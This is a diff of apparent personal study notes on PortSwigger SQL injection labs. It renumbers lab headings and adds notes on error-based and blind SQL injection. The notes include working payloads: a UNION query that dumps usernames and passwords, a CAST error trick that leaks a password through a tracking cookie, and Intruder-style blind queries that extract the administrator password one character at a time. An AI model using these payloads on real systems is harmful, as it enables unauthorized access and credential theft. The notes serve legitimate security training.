@@ -114,7 +114,7 @@ Gifts'+union+SELECT+null,username || ' **\*** ' || password+FROM+users--+
 final payload:
 Gifts'+union+SELECT+null,username+||+'+++**\***+++'+||+password+FROM+users--+
 
-# [**_3. Lab: SQL injection with filter bypass via XML encoding_**](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
+# [**_5. Lab: SQL injection with filter bypass via XML encoding_**](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
 
 This lab contains a SQL injection vulnerability in its **stock check feature**. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
 
@@ -128,7 +128,7 @@ payload:
 
 in class:
 
-# [**_7. SQL injection attack, listing the database contents on non-Oracle databases_**](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
+# [**_6. SQL injection attack, listing the database contents on non-Oracle databases_**](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
 
 The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
 
@@ -146,14 +146,49 @@ To solve the lab, log in as the administrator user.
 
 in class:
 
-# **_[1. Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)_**
+# **_[7. Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)_**
 
 self:
 
-# **_5. SQL injection attack, querying the database type and version on Oracle_**
+# 8. [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
 
-https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
-
-# **_6. SQL injection attack, querying the database type and version on MySQL and Microsoft_**
+# **_9. SQL injection attack, querying the database type and version on MySQL and Microsoft_**
 
 https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
+
+# 10. [ Lab: Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
+
+```bash
+Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--; session=XoqN3sNVZpZa9RTpkwvj1dSbxkXaPO1M
+```
+
+```html
+<h4>ERROR: invalid input syntax for type integer: "mwp65mnhskwkkmexv85y"</h4>
+```
+
+# 11. [ Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+```sql
+SELECT * FROM tracking_table WHERE trackingId=""
+```
+
+exists = Welcome back
+dosen`t exists = no Welcome back
+
+```bash
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='a'--;
+```
+
+```bash
+' AND (SELECT substring(password, 1,1) FROM users WHERE username='administrator')='a'--;
+```
+
+Cookie: TrackingId=citATd8xWkRQ8F98' AND (SELECT substring(password,§1§,1) FROM users WHERE username='administrator')='§a§'--; session=0q1EeuzSERoSEhWNpbnu6ZD9PqnJ1Xgy
